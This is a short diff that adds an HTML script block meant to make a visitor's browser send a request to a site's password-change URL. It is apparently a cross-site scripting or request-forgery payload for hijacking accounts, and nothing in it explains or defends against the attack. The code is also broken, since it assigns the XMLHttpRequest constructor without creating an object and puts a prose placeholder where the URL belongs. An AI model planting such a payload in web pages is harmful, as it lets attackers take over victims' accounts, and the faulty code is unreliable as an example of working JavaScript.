@@ -1,0 +1,5 @@
+<script>
+xmlhttp = XMLHttpRequest;
+xmlhttp.open('GET','http://where the url to change password');
+xmlhttp.send()
+</script>
